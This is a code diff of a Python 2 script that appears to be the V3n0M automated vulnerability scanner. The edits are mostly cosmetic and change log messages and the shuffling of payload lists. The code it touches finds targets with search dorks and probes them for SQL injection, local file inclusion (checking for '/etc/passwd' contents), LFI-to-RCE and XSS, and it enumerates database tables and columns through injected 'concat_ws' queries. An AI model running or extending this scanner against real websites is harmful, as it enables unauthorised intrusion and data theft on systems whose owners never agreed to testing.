@@ -71,9 +71,13 @@ import itertools
 import Queue
 
 d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
+random.shuffle(d0rk)
 header = [line.strip() for line in open("statics/header", 'r')]
+random.shuffle(header)
 xsses = [line.strip() for line in open("statics/xsses", 'r')]
+random.shuffle(xsses)
 lfis = [line.strip() for line in open("statics/lfi", 'r')]
+random.shuffle(lfis)
 
 sqlerrors = {'MySQL': 'error in your SQL syntax',
              'MiscError': 'mysql_fetch',
@@ -115,8 +119,6 @@ sqlerrors = {'MySQL': 'error in your SQL syntax',
 #   NUMWORKERS=parcomp.cpu_count()  
 
 
-
-
 #This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
 try:
 	codecs.lookup('mbcs')
@@ -125,19 +127,12 @@ except LookupError:
 	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
 	codecs.register(func)
 
-
-
-
 # Colours
 W = "\033[0m"
 R = "\033[31m"
 G = "\033[32m"
 O = "\033[33m"
 B = "\033[34m"
-
-
-
-
 
 # Banner
 def logo():
@@ -146,11 +141,6 @@ def logo():
 	print "|     Release Date 23/10/2013  - Release Version V.3.2.1         |"
 	print "|          THIS IS A PRERELEASE BETA  TEST VERSION               |"
 	print "|                         NovaCygni                              |"
-	print "|                                                                |"
-	print "|                                                                |"
-	print "|                                                                |"
-	print "|                                                                |"
-	print "|                                                                |"
 	print "|                    _____       _____                           |"
 	print "|                   |____ |     |  _  |                          |"
 	print "|             __   __   / /_ __ | |/' |_ __ ___                  |"
@@ -170,8 +160,7 @@ else:
 	subprocess.call("cls", shell=True)
 	logo()
 
-log = "v3n0m-sqli.txt"
-logfile = open(log, "a")
+
 lfi_log = "v3n0m-lfi.txt"
 lfi_log_file = open(lfi_log, "a")
 rce_log = "v3n0m-rce.txt"
@@ -353,7 +342,7 @@ def ClassicINJ(url):
 		source = urllib2.urlopen(host).read()
 		for type, eMSG in sqlerrors.items():
 			if re.search(eMSG, source):
-				print R + "[!] w00t!,w00t!:", O + host, B + "Error:", type, R + " ---> SQL Injection Found"
+				print R + "[SQLi]:", O + host, B + "Error:", type, R + " ---> SQL Injection Found"
 				logfile.write("\n" + host)
 				vuln.append(host)
 				col.append(host)
@@ -374,7 +363,7 @@ def ClassicLFI(url):
 		try:
 			check = urllib2.urlopen(lfiurl + lfi.replace("\n", "")).read()
 			if re.findall("root:x", check):
-				print R + "[!] w00t!,w00t!: ", O + lfiurl + lfi, R + " ---> Local File Include Found"
+				print R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found"
 				lfi_log_file.write("\n" + lfiurl + lfi)
 				vuln.append(lfiurl + lfi)
 				target = lfiurl + lfi
@@ -386,7 +375,7 @@ def ClassicLFI(url):
 					text = urllib2.urlopen(request_web)
 					text = text.read()
 					if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
-						print R + "[!] w00t!,w00t!: ", O + target, R + " ---> LFI to RCE Found"
+						print R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found"
 						rce_log_file.write("\n", target)
 						vuln.append(target)
 				except:
@@ -415,7 +404,7 @@ def ClassicXSS(url):
 					"XSS End Title Tag Vulnerability Detected", source) or re.findall(
 					"XSS Style Tags with Broken Javascript Vulnerability Detected", source) or re.findall("<OY1Py", source) or re.findall(
 					"<LOY2PyTRurb1c", source):
-				print R + "[!] w00t!,w00t!: ", O + url + xss, R + " ---> XSS Found (manual verification required)"
+				print R + "[XSS]: ", O + url + xss, R + " ---> XSS Found (manual verification required)"
 				xss_log_file.write("\n" + url + xss)
 				vuln.append(url + xss)
 		except:
@@ -423,6 +412,8 @@ def ClassicXSS(url):
 
 
 def injtest():
+	log = "v3n0m-sqli.txt"
+	logfile = open(log, "a")
 	print B + "\n[+] Preparing for SQLi scanning ..."
 	print "[+] Can take a while ..."
 	print "[!] Working ...\n"
@@ -518,14 +509,15 @@ while True:
 		numthreads = raw_input('\nEnter no. of threads : ')
 		maxc = raw_input('Enter no. of pages   : ')
 		print "\nNumber of SQL errors :", len(sqlerrors)
-		print "Number of LFI paths  :", len(lfis)
-		print "Number of XSS cheats :", len(xsses)
-		print "Number of headers    :", len(header)
-		print "Number of threads    :", numthreads
-		print "Number of dorks      :", len(go)
-		print "Number of pages      :", maxc
-		print "Timeout in seconds   :", timeout
-		print "Utilised Engines     : 11 >-< Encrypted Engines = 3 "
+		print "LFI payloads    :", len(lfis)
+		print "XSS payloads    :", len(xsses)
+		print "Headers         :", len(header)
+		print "Threads         :", numthreads
+		print "Dorks           :", len(go)
+		print "Pages           :", maxc
+		print "Timeout         :", timeout
+		print "Search Engines  : 11"
+		print "Encrypted SE    : 3"
 		print ""
 		print ""
 		print ""
@@ -653,7 +645,7 @@ while True:
 							source = urllib2.urlopen(target_table).read()
 							search = re.findall("NovaCygni", source)
 							if len(search) > 0:
-								print "\n[!] w00t!w00t! Found a table called: < " + table + " >"
+								print "\n[!] Table found: < " + table + " >"
 								print "\n[+] Lets check for columns inside table < " + table + " >"
 								for column in columns:
 									try:
@@ -661,7 +653,7 @@ while True:
 										                                              "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
 										search = re.findall("NovaCygni", source)
 										if len(search) > 0:
-											print "\t[!] w00t!w00t! Found a column called: < " + column + " >"
+											print "\t[!] Column found: < " + column + " >"
 									except(KeyboardInterrupt, SystemExit):
 										raise
 									except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
